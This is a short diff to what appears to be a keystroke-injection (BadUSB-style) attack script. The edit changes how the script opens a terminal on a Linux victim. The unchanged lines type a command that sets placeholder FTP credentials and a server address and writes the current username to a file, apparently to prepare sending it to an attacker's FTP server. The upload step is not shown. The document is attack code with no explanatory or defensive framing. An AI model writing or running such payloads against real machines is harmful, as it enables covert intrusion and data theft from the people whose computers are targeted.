@@ -1,5 +1,5 @@
 Delay 1000
-RunUnix gnome-terminal
+CtrlAltT
 Delay 3000
 PrintLine export xfile='LinuxUser.txt'; export ftpuser='USERNAME'; export ftppass='PASSWORD'; data="$(whoami)"; echo ${data}>${xfile}; export xip='IPSERVERFTP'
 Delay 3000
